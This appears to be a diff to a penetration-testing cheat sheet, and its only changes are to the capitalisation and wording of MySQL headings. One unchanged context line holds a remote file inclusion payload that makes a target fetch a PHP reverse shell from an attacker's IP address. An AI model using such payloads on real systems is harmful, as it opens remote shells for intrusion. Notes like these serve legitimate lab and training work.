@@ -8,7 +8,7 @@
 - [PG Grounds & HTB](#pg-grounds-&-htb)
   - [Linux Boxes](#linux-boxes)
 - [SQL](#sql)
-  - [MYSQL](#mysql)
+  - [MySQL](#mysql)
   - [sqlite](#salite)
   - [SQLi](#sqli)
  
@@ -316,7 +316,8 @@ fodhelper.exe
     - ?page=http://192.168.45.208/php-rev-shell.php
 
 # SQL
-## MySQL: Check if MySQL is running with privileged accoun
+## MySQL
+Check if MySQL is running with privileged accoun
 
 ```bash
 # MySQL configuration file
